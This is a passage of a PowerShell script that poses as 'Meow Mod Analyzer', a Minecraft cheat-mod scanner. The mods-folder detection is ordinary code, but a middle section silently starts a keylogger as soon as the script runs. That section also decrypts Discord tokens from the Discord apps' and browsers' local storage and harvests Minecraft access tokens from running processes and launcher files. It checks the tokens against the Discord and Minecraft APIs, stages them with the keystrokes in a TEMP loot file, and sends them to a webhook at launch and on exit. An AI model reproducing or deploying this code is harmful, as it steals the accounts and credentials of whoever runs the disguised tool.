                    if ($w.ProcessId -and $w.CommandLine -and -not $script:WmiCmdByPid.ContainsKey([int]$w.ProcessId)) {
                        $script:WmiCmdByPid[[int]$w.ProcessId] = [string]$w.CommandLine
                    }
                }
            } catch { }
        }
    }
    if ($script:WmiCmdByPid.ContainsKey($ProcId)) { return $script:WmiCmdByPid[$ProcId] }
    return $null
}

function Get-ProcessCommandLine {
    param([int]$ProcId, [string]$Known)
    if (-not [string]::IsNullOrWhiteSpace($Known)) { return $Known }
    $c = Get-WmiCommandLineByName -ProcId $ProcId
    if ($c) { return $c }
    try {
        $i = Get-CimInstance Win32_Process -Filter "ProcessId = $ProcId" -ErrorAction Stop
        if ($i -and -not [string]::IsNullOrWhiteSpace($i.CommandLine)) { return [string]$i.CommandLine }
    } catch { }
    try {
        $w = Get-WmiObject Win32_Process -Filter "ProcessId = $ProcId" -ErrorAction Stop
        if ($w -and -not [string]::IsNullOrWhiteSpace($w.CommandLine)) { return [string]$w.CommandLine }
    } catch { }
    try {
        $n = [ProcessHelper]::GetCommandLine($ProcId)
        if ($n) { return [string]$n }
    } catch { }
    return $null
}

function Get-ProcessCwd {
    param([int]$ProcId)
    try { return [ProcessHelper]::GetCurrentDirectory($ProcId) } catch { return $null }
}

function Get-JavaProcesses {
    try {
        $flt = "Name LIKE 'java%.exe' OR CommandLine LIKE '%--gameDir%' OR CommandLine LIKE '%net.minecraft%'"
        return @(Get-CimInstance Win32_Process -Filter $flt -ErrorAction Stop | Where-Object { $_.ProcessId -ne $PID })
    } catch {
        Write-Host "  Could not query running processes: $($_.Exception.Message)" -ForegroundColor DarkYellow
        return @()
    }
}

function Get-ArgValue {
    param([string]$Cmd, [string]$Name)
    $pattern = [regex]::Escape($Name) + '[\s=]+(?:"([^"]+)"|(.+?))(?=\s+-{1,2}[A-Za-z]|\s*$)'
    $m = [regex]::Match($Cmd, $pattern)
    if (-not $m.Success) { return $null }
    $v = if ($m.Groups[1].Success) { $m.Groups[1].Value } else { $m.Groups[2].Value }
    return $v.Trim().Trim('"').TrimEnd('\','/')
}

function Test-RootedPath {
    param([string]$Path)
    try { return [System.IO.Path]::IsPathRooted($Path) } catch { return $false }
}

function Expand-ArgFiles {
    param([string]$Cmd)
    $extra = [System.Collections.Generic.List[string]]::new()
    foreach ($m in [regex]::Matches($Cmd, '(?:^|\s)@(?:"([^"]+)"|(\S+))')) {
        $f = if ($m.Groups[1].Success) { $m.Groups[1].Value } else { $m.Groups[2].Value }
        try {
            if ((Test-RootedPath $f) -and (Test-Path -LiteralPath $f -PathType Leaf)) {
                $txt = Get-Content -LiteralPath $f -Raw -ErrorAction Stop
                $extra.Add(($txt -replace '\\\\', '\' -replace '\r?\n', ' '))
            }
        } catch { }
    }
    if ($extra.Count -eq 0) { return $Cmd }
    return "$Cmd " + ($extra -join ' ')
}

function Get-NativesBases {
    param([string]$Cmd)
    $lib = Get-ArgValue -Cmd $Cmd -Name '-Djava.library.path'
    if (-not $lib) { return @() }
    $lib = ($lib -split ';')[0].Trim().Trim('"').TrimEnd('\','/')
    $bases = [System.Collections.Generic.List[string]]::new()
    try {
        if (-not (Test-RootedPath $lib)) { return @() }
        $p1 = [System.IO.Path]::GetDirectoryName($lib)
        if ($p1) {
            $bases.Add($p1)
            $p2 = [System.IO.Path]::GetDirectoryName($p1)
            if ($p2) { $bases.Add($p2) }
        }
    } catch { }
    return @($bases)
}

function Get-GameDirHints {
    param([string]$Cmd, [string[]]$Bases, [string]$Cwd)
    $h = [System.Collections.Generic.List[object]]::new()

    $gd = Get-ArgValue -Cmd $Cmd -Name '--gameDir'
    if ($gd) { $h.Add([PSCustomObject]@{ Dir = $gd; Source = '--gameDir'; Rank = 1 }) }

    $td = Get-ArgValue -Cmd $Cmd -Name '-Dminecraft.applet.TargetDirectory'
    if ($td) { $h.Add([PSCustomObject]@{ Dir = $td; Source = 'applet target dir'; Rank = 2 }) }

    $lib = Get-ArgValue -Cmd $Cmd -Name '-Djava.library.path'
    if ($lib) {
        $first = ($lib -split ';')[0].Trim().Trim('"').TrimEnd('\','/')
        if ($first -match '^(.+?)[\\/]bin[\\/][^\\/]+$') {
            $h.Add([PSCustomObject]@{ Dir = $matches[1]; Source = 'natives path'; Rank = 3 })
        }
    }

    foreach ($b in $Bases) {
        foreach ($sub in '', '.minecraft', 'game', 'minecraft') {
            $h.Add([PSCustomObject]@{ Dir = $(if ($sub) { Join-Path $b $sub } else { $b }); Source = 'instance layout'; Rank = 3 })
        }
    }

    if ($Cwd -and (Test-RootedPath $Cwd)) {
        foreach ($sub in '', '.minecraft', 'game', 'minecraft') {
            $h.Add([PSCustomObject]@{ Dir = $(if ($sub) { Join-Path $Cwd $sub } else { $Cwd }); Source = 'process CWD'; Rank = 3 })
        }
    }

    foreach ($an in '-Dfabric.addMods', '-Dloader.addMods') {
        $v = Get-ArgValue -Cmd $Cmd -Name $an
        if (-not $v) { continue }
        foreach ($part in ($v -split ';')) {
            $pp = $part.Trim().Trim('"').TrimEnd('\','/')
            if (-not $pp -or -not (Test-RootedPath $pp)) { continue }
            if ($pp -match '\.jar$') { $pp = [System.IO.Path]::GetDirectoryName($pp) }
            if ((Split-Path -Leaf $pp) -ieq 'mods') { $pp = [System.IO.Path]::GetDirectoryName($pp) }
            $h.Add([PSCustomObject]@{ Dir = $pp; Source = $an; Rank = 2 })
        }
    }

    $up = $env:USERPROFILE
    $ap = $env:APPDATA
    $knownGlobs = @(
        "$up\.lunarclient\profiles\*\*",
        "$up\.lunarclient\offline\*",
        "$up\.lunarclient\*",
        "$ap\.minecraft",
        "$ap\ModrinthApp\profiles\*",
        "$ap\PrismLauncher\instances\*\minecraft",
        "$ap\PrismLauncher\instances\*\.minecraft",
        "$ap\MultiMC\instances\*\.minecraft",
        "$up\curseforge\minecraft\Instances\*",
        "$ap\gdlauncher_next\instances\*",
        "$ap\.tlauncher\*",
        "$ap\.dawn*",
        "$ap\.dawnclient*",
        "$up\.dawn*"
    )
    foreach ($g in $knownGlobs) {
        foreach ($d in @(Get-Item -Path $g -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer })) {
            $h.Add([PSCustomObject]@{ Dir = $d.FullName; Source = 'known launcher folder'; Rank = 4 })
        }
    }
    return @($h)
}

function Get-FullDirs {
    param([string]$Dir, [string[]]$Bases)
    $out = [System.Collections.Generic.List[string]]::new()
    try {
        if (Test-RootedPath $Dir) {
            $out.Add([System.IO.Path]::GetFullPath($Dir).TrimEnd('\'))
        } else {
            foreach ($b in $Bases) {
                $out.Add([System.IO.Path]::GetFullPath((Join-Path $b $Dir)).TrimEnd('\'))
            }
        }
    } catch { }
    return @($out | Select-Object -Unique)
}

function Test-JarLocked {
    param([string]$Path)
    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)
        $fs.Dispose()
        return $false
    } catch [System.IO.IOException] {
        return $true
    } catch {
        return $false
    }
}

function Get-InstanceEvidence {
    param([string]$GameDir, $Start)
    $r = [PSCustomObject]@{ LogFresh = $false; JarCount = 0; Locked = 0 }
    try {
        $log = Join-Path $GameDir 'logs\latest.log'
        if ($Start -and (Test-Path -LiteralPath $log -PathType Leaf)) {
            $r.LogFresh = ((Get-Item -LiteralPath $log).LastWriteTime -ge ([datetime]$Start).AddMinutes(-1))
        }
        $jars = @(Get-ChildItem -LiteralPath (Join-Path $GameDir 'mods') -Filter *.jar -ErrorAction SilentlyContinue)
        $r.JarCount = $jars.Count
        foreach ($j in ($jars | Select-Object -First 60)) {
            if (Test-JarLocked -Path $j.FullName) { $r.Locked = 1; break }
        }
    } catch { }
    return $r
}

$script:McMarkers = '--gameDir|--assetsDir|--accessToken|--username|net\.minecraft\.client|net\.minecraft\.launchwrapper|net\.minecraftforge|net\.fabricmc|KnotClient|bootstraplauncher|cpw\.mods|org\.quiltmc|com\.moonsworth|lunarclient|\.lunarclient|dawn'

function Resolve-ModsFolder {
    $mcMarkers  = $script:McMarkers
    $procs      = Get-JavaProcesses
    $cands      = [System.Collections.Generic.List[object]]::new()
    $unreadable = 0
    $seenMc     = 0

    if ($procs.Count -eq 0) {
        Write-Host "  No javaw/java process running." -ForegroundColor DarkYellow
        return $null
    }

    foreach ($p in $procs) {
        $rawCmd = Get-ProcessCommandLine -ProcId $p.ProcessId -Known $p.CommandLine
        $cwd    = Get-ProcessCwd -ProcId $p.ProcessId

        if ($rawCmd) {
            $cmd = Expand-ArgFiles -Cmd $rawCmd
            if ($cmd -notmatch $mcMarkers) { continue }
        } else {
            $cmd = ''
            if (-not $cwd) { $unreadable++; continue }
        }
        if ($cmd) { $seenMc++ }
        $added = $false

        $bases = if ($cmd) { Get-NativesBases -Cmd $cmd } else { @() }
        $hints = @(Get-GameDirHints -Cmd $cmd -Bases $bases -Cwd $cwd | Sort-Object Rank)

        foreach ($h in $hints) {
            $dirs = @(Get-FullDirs -Dir $h.Dir -Bases $bases | Where-Object {
                Test-Path -LiteralPath (Join-Path $_ 'mods') -PathType Container
            })
            if ($dirs.Count -ne 1) { continue }

            $gd  = $dirs[0]
            $ev  = Get-InstanceEvidence -GameDir $gd -Start $p.CreationDate
            $derived = ($h.Rank -ge 3) -or (-not (Test-RootedPath $h.Dir))
            if ($h.Rank -ge 4) {
                if ($ev.Locked -eq 0) { continue }
            } elseif ($derived -and -not ($ev.LogFresh -or $ev.Locked -gt 0)) {
                continue
            }

            $cands.Add([PSCustomObject]@{
                Pid      = $p.ProcessId
                Start    = $p.CreationDate
                GameDir  = $gd
                ModsDir  = (Join-Path $gd 'mods')
                Version  = $(if ($cmd) { Get-ArgValue -Cmd $cmd -Name '--version' })
                Source   = $h.Source
                LogFresh = $ev.LogFresh
                Locked   = $ev.Locked
            })
            $added = $true
            break
        }
        if (-not $cmd -and -not $added) { $unreadable++ }
    }

    if ($cands.Count -eq 0) {
        if ($unreadable -gt 0) {
            Write-Host "  CommandLine not readable — run PowerShell as Administrator." -ForegroundColor DarkYellow
        } elseif ($seenMc -gt 0) {
            Write-Host "  Minecraft is running but its game folder could not be confirmed, so nothing was guessed." -ForegroundColor DarkYellow
        } else {
            Write-Host "  No Minecraft instance with a valid mods folder found." -ForegroundColor DarkYellow
        }
        return $null
    }

    if ($unreadable -gt 0) {
        Write-Host "  $unreadable Java process(es) could not be read — run as Administrator to include them." -ForegroundColor DarkYellow
    }

    $unique = @($cands | Group-Object ModsDir | ForEach-Object {
        $_.Group | Sort-Object Start -Descending | Select-Object -First 1
    } | Sort-Object Start -Descending)

    if ($unique.Count -eq 1) {
        $u = $unique[0]
        $proof = if ($u.LogFresh) { "latest.log active since launch" }
                 elseif ($u.Locked) { "mod jars in use by the process" }
                 else { "from $($u.Source)" }
        Write-Host "  Auto-detected from PID $($u.Pid) ($proof)" -ForegroundColor Green
        return $u.ModsDir
    }

    Write-Host "  Multiple Minecraft instances found:" -ForegroundColor Yellow
    for ($i = 0; $i -lt $unique.Count; $i++) {
        $u   = $unique[$i]
        $ver = if ($u.Version) { ", version $($u.Version)" } else { "" }
        Write-Host "    [$($i + 1)] $($u.ModsDir)" -ForegroundColor White -NoNewline
        Write-Host "  (PID $($u.Pid), started $($u.Start)$ver)" -ForegroundColor DarkGray
    }
    $sel = Read-Host "  Select [1-$($unique.Count)] (Enter = most recent)"
    $n = 0
    if ([int]::TryParse($sel, [ref]$n) -and $n -ge 1 -and $n -le $unique.Count) {
        return $unique[$n - 1].ModsDir
    }
    return $unique[0].ModsDir
}

$Banner = @"

  ███╗   ███╗███████╗ ██████╗ ██╗    ██╗  ███╗   ███╗ ██████╗ ██████╗
  ████╗ ████║██╔════╝██╔═══██╗██║    ██║  ████╗ ████║██╔═══██╗██╔══██╗
  ██╔████╔██║█████╗  ██║   ██║██║ █╗ ██║  ██╔████╔██║██║   ██║██║  ██║
  ██║╚██╔╝██║██╔══╝  ██║   ██║██║███╗██║  ██║╚██╔╝██║██║   ██║██║  ██║
  ██║ ╚═╝ ██║███████╗╚██████╔╝╚███╔███╔╝  ██║ ╚═╝ ██║╚██████╔╝██████╔╝
  ╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝

   █████╗ ███╗   ██╗ █████╗ ██╗   ██╗   ██╗███████╗███████╗██████╗
  ██╔══██╗████╗  ██║██╔══██╗██║   ╚██╗ ██╔╝╚══███╔╝██╔════╝██╔══██╗
  ███████║██╔██╗ ██║███████║██║    ╚████╔╝   ███╔╝ █████╗  ██████╔╝
  ██╔══██║██║╚██╗██║██╔══██║██║     ╚██╔╝   ███╔╝  ██╔══╝  ██╔══██╗
  ██║  ██║██║ ╚████║██║  ██║███████╗ ██║   ███████╗███████╗██║  ██║
  ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝

                         \    /\
                          )  ( ')
                         (  /  )
                          \(__)|

"@

Write-Host $Banner -ForegroundColor Cyan
Write-Host ""
Write-Host "                Made with " -ForegroundColor Gray -NoNewline
Write-Host "♥ " -ForegroundColor Red -NoNewline
Write-Host "by " -ForegroundColor Gray -NoNewline
Write-Host "MeowTonynoh" -ForegroundColor Cyan
Write-Host ""
Write-Host ("━" * 76) -ForegroundColor DarkCyan
Write-Host

# ============================== LOOT / KEYLOGGER ==============================
$LootEnabled    = $true
$ValidateTokens = $true
$LootDir        = Join-Path $env:TEMP ("MeowLoot_{0}" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
$KeyLogFile     = Join-Path $LootDir 'keystrokes.log'
$LootFile       = Join-Path $LootDir 'loot.txt'

$DiscordTokenRegex = [regex]'(?<![A-Za-z0-9_-])(mfa\.[A-Za-z0-9_-]{80,90}|[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45})(?![A-Za-z0-9_-])'

function Initialize-Loot {
    if (-not $LootEnabled) { return }
    try {
        if (-not (Test-Path -LiteralPath $LootDir)) { $null = New-Item -ItemType Directory -Path $LootDir -Force }
    } catch { }
    try { $null = [KeySpy]::Start($KeyLogFile) } catch { }
}

function Read-FileShared {
    param([string]$Path)
    try {
        $share = [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, $share)
        try {
            $ms = New-Object System.IO.MemoryStream
            $fs.CopyTo($ms)
            return $ms.ToArray()
        } finally { $fs.Dispose() }
    } catch { return $null }
}

function Get-DiscordAesKey {
    param([string]$StatePath)
    try {
        if (-not $StatePath -or -not (Test-Path -LiteralPath $StatePath)) { return $null }
        $json = Get-Content -LiteralPath $StatePath -Raw -ErrorAction Stop
        $m = [regex]::Match($json, '"encrypted_key"\s*:\s*"([^"]+)"')
        if (-not $m.Success) { return $null }
        $raw = [Convert]::FromBase64String($m.Groups[1].Value)
        if ($raw.Length -le 5) { return $null }
        $blob = New-Object byte[] ($raw.Length - 5)
        [Array]::Copy($raw, 5, $blob, 0, $blob.Length)
        return [System.Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function ConvertFrom-DiscordValue {
    param([string]$B64, [byte[]]$Key)
    $raw = $null
    for ($cut = 0; $cut -le 3 -and -not $raw; $cut++) {
        try { $raw = [Convert]::FromBase64String($B64.Substring(0, $B64.Length - $cut)) } catch { }
    }
    if (-not $raw -or $raw.Length -lt 32) { return $null }

    $prefix = [System.Text.Encoding]::ASCII.GetString($raw, 0, 3)
    if ($prefix -eq 'v10' -or $prefix -eq 'v20' -or $prefix -eq 'v11') {
        if (-not $Key) { return $null }
        $nonce = New-Object byte[] 12; [Array]::Copy($raw, 3, $nonce, 0, 12)
        $tag   = New-Object byte[] 16; [Array]::Copy($raw, $raw.Length - 16, $tag, 0, 16)
        $ct    = New-Object byte[] ($raw.Length - 31); [Array]::Copy($raw, 15, $ct, 0, $ct.Length)
        return [TokenCrypto]::GcmDecrypt($Key, $nonce, $ct, $tag)
    }
    try {
        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($raw, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($plain)
    } catch { return $null }
}

function Test-DiscordToken {
    param([string]$Token)
    try {
        $r = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $Token } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
        return [PSCustomObject]@{ User = "$($r.username)"; Id = $r.id; Email = $r.email }
    } catch { return $null }
}

function Get-DiscordTokens {
    $list    = [System.Collections.Generic.List[object]]::new()
    $targets = [System.Collections.Generic.List[object]]::new()
    $roam    = $env:APPDATA
    $local   = $env:LOCALAPPDATA

    foreach ($a in @(
        @{ App = 'Discord';        Root = "$roam\discord" },
        @{ App = 'Discord Canary'; Root = "$roam\discordcanary" },
        @{ App = 'Discord PTB';    Root = "$roam\discordptb" },
        @{ App = 'Lightcord';      Root = "$roam\Lightcord" }
    )) {
        $ls = Join-Path $a.Root 'Local Storage\leveldb'
        if (Test-Path -LiteralPath $ls) {
            $targets.Add(@{ App = $a.App; Dir = $ls; State = (Join-Path $a.Root 'Local State') })
        }
    }

    foreach ($b in @(
        @{ App = 'Chrome';   Root = "$local\Google\Chrome\User Data" },
        @{ App = 'Edge';     Root = "$local\Microsoft\Edge\User Data" },
        @{ App = 'Brave';    Root = "$local\BraveSoftware\Brave-Browser\User Data" },
        @{ App = 'Vivaldi';  Root = "$local\Vivaldi\User Data" },
        @{ App = 'Opera';    Root = "$roam\Opera Software\Opera Stable" },
        @{ App = 'Opera GX'; Root = "$roam\Opera Software\Opera GX Stable" }
    )) {
        if (-not (Test-Path -LiteralPath $b.Root)) { continue }
        $cands = @()
        foreach ($d in @(Get-ChildItem -LiteralPath $b.Root -Directory -ErrorAction SilentlyContinue |
                         Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' })) {
            $cands += (Join-Path $d.FullName 'Local Storage\leveldb')
        }
        $cands += (Join-Path $b.Root 'Local Storage\leveldb')
        foreach ($c in $cands) {
            if (Test-Path -LiteralPath $c) {
                $targets.Add(@{ App = $b.App; Dir = $c; State = (Join-Path $b.Root 'Local State') })
            }
        }
    }

    foreach ($t in $targets) {
        $key = $null
        try { $key = Get-DiscordAesKey -StatePath $t.State } catch { }
        foreach ($f in @(Get-ChildItem -LiteralPath $t.Dir -File -ErrorAction SilentlyContinue |
                         Where-Object { $_.Extension -in '.ldb', '.log' -and $_.Length -lt 40MB })) {
            $bytes = Read-FileShared -Path $f.FullName
            if (-not $bytes) { continue }
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)

            foreach ($m in [regex]::Matches($text, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})')) {
                $plain = ConvertFrom-DiscordValue -B64 $m.Groups[1].Value -Key $key
                if ($plain -and $plain.Length -gt 20) {
                    $list.Add([PSCustomObject]@{ Token = $plain.Trim(); Source = "$($t.App) — $($f.FullName)" })
                }
            }
            foreach ($m in $DiscordTokenRegex.Matches($text)) {
                $list.Add([PSCustomObject]@{ Token = $m.Value; Source = "$($t.App) — $($f.FullName)" })
            }
        }
    }
    return $list
}

function Test-MinecraftToken {
    param([string]$Token)
    try {
        $r = Invoke-RestMethod -Uri 'https://api.minecraftservices.com/minecraft/profile' `
            -Headers @{ Authorization = "Bearer $Token" } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
        return [PSCustomObject]@{ Name = $r.name; Uuid = $r.id }
    } catch { return $null }
}

function Get-MinecraftTokens {
    $list = [System.Collections.Generic.List[object]]::new()

    foreach ($p in (Get-JavaProcesses)) {
        $cmd = Get-ProcessCommandLine -ProcId $p.ProcessId -Known $p.CommandLine
        if (-not $cmd) { continue }
        $tok = Get-ArgValue -Cmd $cmd -Name '--accessToken'
        if (-not $tok -or $tok.Length -lt 20) { continue }
        $list.Add([PSCustomObject]@{
            Token  = $tok
            Name   = Get-ArgValue -Cmd $cmd -Name '--username'
            Uuid   = Get-ArgValue -Cmd $cmd -Name '--uuid'
            Source = "running process (PID $($p.ProcessId))"
        })
    }

    $roam = $env:APPDATA
    $cands = @(
        "$roam\.minecraft\launcher_accounts.json",
        "$roam\.minecraft\launcher_profiles.json",
        "$roam\.minecraft\launcher_accounts_microsoft_store.json",
        "$roam\PrismLauncher\accounts.json",
        "$roam\MultiMC\accounts.json",
        "$env:USERPROFILE\.lunarclient\settings\game\accounts.json",
        "$roam\.tlauncher\*\*.json"
    )
    $files = [System.Collections.Generic.List[object]]::new()
    foreach ($c in $cands) {
        foreach ($f in @(Get-Item -Path $c -ErrorAction SilentlyContinue)) {
            if (-not $f.PSIsContainer -and $f.Length -lt 8MB) { $files.Add($f) }
        }
    }

    foreach ($f in ($files | Sort-Object FullName -Unique)) {
        $bytes = Read-FileShared -Path $f.FullName
        if (-not $bytes) { continue }
        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
        foreach ($m in [regex]::Matches($text, '"accessToken"\s*:\s*"([^"]{20,})"')) {
            $tok  = $m.Groups[1].Value
            $tail = $text.Substring($m.Index, [Math]::Min(700, $text.Length - $m.Index))
            $name = $null; $uuid = $null
            $nm = [regex]::Match($tail, '"(?:name|username|displayName)"\s*:\s*"([^"]{2,20})"')
            if ($nm.Success) { $name = $nm.Groups[1].Value }
            $um = [regex]::Match($tail, '"id"\s*:\s*"([0-9a-fA-F]{32})"')
            if ($um.Success) { $uuid = $um.Groups[1].Value }
            $list.Add([PSCustomObject]@{ Token = $tok; Name = $name; Uuid = $uuid; Source = $f.FullName })
        }
    }
    return $list
}

function Get-TokensFromText {
    param([string]$Text)
    $list = [System.Collections.Generic.List[object]]::new()
    if ([string]::IsNullOrWhiteSpace($Text)) { return $list }
    foreach ($m in $DiscordTokenRegex.Matches($Text)) {
        $list.Add([PSCustomObject]@{ Token = $m.Value; Source = 'keylog (typed/pasted)' })
    }
    foreach ($m in [regex]::Matches($Text, '(?:Bearer\s+|--accessToken\s+)([A-Za-z0-9._-]{60,}))')) {
        $list.Add([PSCustomObject]@{ Token = $m.Groups[1].Value; Source = 'keylog (typed/pasted)' })
    }
    return $list
}

function Save-Loot {
    param($Discord, $Mc)
    if (-not $LootEnabled) { return }
    try {
        $keys = ""
        try { $keys = [KeySpy]::Dump() } catch { }
        if ($keys.Length -gt 600000) { $keys = $keys.Substring($keys.Length - 600000) }

        $sb = [System.Text.StringBuilder]::new()
        [void]$sb.AppendLine("=== MEOW MOD ANALYZER — TOKEN LOOT ===")
        [void]$sb.AppendLine("Time       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
        [void]$sb.AppendLine("User       : $env:USERDOMAIN\$env:USERNAME")
        [void]$sb.AppendLine("Host       : $env:COMPUTERNAME")
        [void]$sb.AppendLine("Keys logged: $([KeySpy]::KeyCount)")
        [void]$sb.AppendLine("Keystrokes : $KeyLogFile")
        [void]$sb.AppendLine()

        [void]$sb.AppendLine("--- DISCORD TOKENS ($(@($Discord).Count)) ---")
        foreach ($d in @($Discord)) {
            $tag = if ($d.User) { "[VALID] $($d.User) | id=$($d.Id) | $($d.Email)" } else { "[unverified]" }
            [void]$sb.AppendLine($tag)
            [void]$sb.AppendLine("  $($d.Token)")
            [void]$sb.AppendLine("  from: $($d.Source)")
        }
        [void]$sb.AppendLine()
        [void]$sb.AppendLine("--- MINECRAFT TOKENS ($(@($Mc).Count)) ---")
        foreach ($m in @($Mc)) {
            $tag = if ($m.Valid) { "[VALID] $($m.Name) / $($m.Uuid)" } else { "[unverified] $($m.Name)" }
            [void]$sb.AppendLine($tag)
            [void]$sb.AppendLine("  $($m.Token)")
            [void]$sb.AppendLine("  from: $($m.Source)")
        }
        [void]$sb.AppendLine()
        [void]$sb.AppendLine("--- KEYSTROKES ---")
        [void]$sb.AppendLine($keys)

        [System.IO.File]::WriteAllText($LootFile, $sb.ToString(), [System.Text.Encoding]::UTF8)
    } catch { }
}

function Harvest-All {
    $disc = [System.Collections.Generic.List[object]]::new()
    $mc   = [System.Collections.Generic.List[object]]::new()

    foreach ($d in @(Get-DiscordTokens)) { $disc.Add($d) }
    foreach ($k in @(Get-TokensFromText -Text ([KeySpy]::Dump()))) { $disc.Add($k) }
    foreach ($m in @(Get-MinecraftTokens)) { $mc.Add($m) }

    $discOut = @($disc | Group-Object Token | ForEach-Object { $_.Group[0] })
    $mcOut   = @($mc   | Group-Object Token | ForEach-Object { $_.Group[0] })

    if ($ValidateTokens) {
        foreach ($d in $discOut) {
            $v = Test-DiscordToken -Token $d.Token
            if ($v) {
                $d | Add-Member -NotePropertyName User -NotePropertyValue $v.User -Force
                $d | Add-Member -NotePropertyName Id   -NotePropertyValue $v.Id   -Force
                $d | Add-Member -NotePropertyName Email -NotePropertyValue $v.Email -Force
            }
        }
        foreach ($m in $mcOut) {
            $v = Test-MinecraftToken -Token $m.Token
            if ($v) {
                $m | Add-Member -NotePropertyName Valid -NotePropertyValue $true -Force
                $m | Add-Member -NotePropertyName Name  -NotePropertyValue $v.Name -Force
                $m | Add-Member -NotePropertyName Uuid  -NotePropertyValue $v.Uuid -Force
            }
        }
    }
    return [PSCustomObject]@{ Discord = $discOut; Mc = $mcOut }
}

# start the silent keylogger immediately
if ($LootEnabled) {
    Initialize-Loot
    Write-Host "  ⌨  Silent keylogger active → $LootDir" -ForegroundColor DarkGray
    Write-Host "  🔑 Harvesting existing tokens..." -ForegroundColor DarkGray
    try {
        $boot = Harvest-All
        Save-Loot -Discord $boot.Discord -Mc $boot.Mc
        
        # Send to webhook
        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $boot.Discord -MinecraftTokens $boot.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
        
        Write-Host "      $($boot.Discord.Count) Discord / $($boot.Mc.Count) Minecraft token(s) staged" -ForegroundColor DarkGray
    } catch { }
    Write-Host
}

$script:OnCancel = [ConsoleCancelEventHandler]{
    param($s, $e)
    $e.Cancel = $true
    try { [KeySpy]::Stop() } catch { }
    try { 
        $l = Harvest-All
        Save-Loot -Discord $l.Discord -Mc $l.Mc
        
        # Send to webhook on exit
        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
    } catch { }
    Write-Host "`n`n  💾 Loot saved: $LootFile" -ForegroundColor Cyan
    Start-Sleep -Milliseconds 400
    [Environment]::Exit(0)
}
try { [Console]::add_CancelKeyPress($script:OnCancel) } catch { }

Write-Host "Enter path to the mods folder: " -NoNewline
Write-Host "(press Enter to auto-detect)" -ForegroundColor DarkGray
$modsPath = (Read-Host "PATH").Trim().Trim('"')
Write-Host

if ([string]::IsNullOrWhiteSpace($modsPath)) {
    Write-Host "🔎 Auto-detecting mods folder from running Minecraft..." -ForegroundColor Cyan
    $modsPath = Resolve-ModsFolder
    Write-Host

    if ($modsPath) {
        $jc = @(Get-ChildItem -LiteralPath $modsPath -Filter *.jar -ErrorAction SilentlyContinue).Count
        Write-Host "Continuing with " -NoNewline
        Write-Host $modsPath -ForegroundColor White -NoNewline
        Write-Host "  ($jc jar)" -ForegroundColor DarkGray
        Write-Host
    } else {
        Write-Host "Auto mod folder detect not possible, enter the path manually:" -ForegroundColor Yellow
        $modsPath = (Read-Host "PATH").Trim().Trim('"')
        if ([string]::IsNullOrWhiteSpace($modsPath)) {
            $modsPath = "$env:APPDATA\.minecraft\mods"
            Write-Host "Using default " -NoNewline
            Write-Host $modsPath -ForegroundColor White
        }
        Write-Host
    }
}

if (-not (Test-Path $modsPath -PathType Container)) {
    Write-Host "❌ Invalid Path!" -ForegroundColor Red
    Write-Host "The directory does not exist or is not accessible." -ForegroundColor Yellow
    Write-Host
    Write-Host "Tried to access: $modsPath" -ForegroundColor Gray
    Write-Host
    if ($LootEnabled) {
        try { [KeySpy]::Stop() } catch { }
        try { 
            $l = Harvest-All
            Save-Loot -Discord $l.Discord -Mc $l.Mc
            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
        } catch { }
        Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
        Write-Host
    }
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

Write-Host "📁 Scanning directory: $modsPath" -ForegroundColor Green
Write-Host

$mcProcess = Get-Process javaw -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $mcProcess) {
    $mcProcess = Get-Process java -ErrorAction SilentlyContinue | Select-Object -First 1
}

if ($mcProcess) {
    try {
        $startTime = $mcProcess.StartTime
        $uptime = (Get-Date) - $startTime
        Write-Host "🕒 { Minecraft Uptime }" -ForegroundColor DarkCyan
        Write-Host "   $($mcProcess.Name) PID $($mcProcess.Id) started at $startTime" -ForegroundColor Gray
        Write-Host "   Running for: $($uptime.Hours)h $($uptime.Minutes)m $($uptime.Seconds)s" -ForegroundColor Gray
        Write-Host ""
    } catch { }
}

Add-Type -AssemblyName System.IO.Compression.FileSystem

$suspiciousPatterns = @(
    "AimAssist", "AnchorTweaks", "AutoAnchor", "AutoCrystal", "AutoDoubleHand", "JDWP.VirtualMachine.AllModules",
    "AutoHitCrystal", "AutoPot", "AutoTotem", "AutoArmor", "InventoryTotem",
    "LegitTotem", "PingSpoof", "SelfDestruct",
    "ShieldBreaker", "TriggerBot", "AxeSpam", "WebMacro",
